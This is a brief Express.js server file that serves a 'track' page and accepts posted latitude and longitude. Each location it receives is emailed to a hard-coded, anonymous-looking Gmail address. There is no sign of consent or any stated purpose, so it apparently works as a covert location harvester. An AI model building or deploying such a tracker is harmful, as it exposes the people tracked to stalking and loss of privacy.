const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const sender = require('./sender');

app.use(bodyParser.json());

app.get('/track', (req, res) => {
  res.sendFile(__dirname + '/track.html');
});

app.post('/location', express.json(), (req, res) => {
  const { lat, lng } = req.body;
  sender.sendMail('unkn0wnuse3r1@gmail.com', lat, lng);
  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log('Server listening on port 3000');
});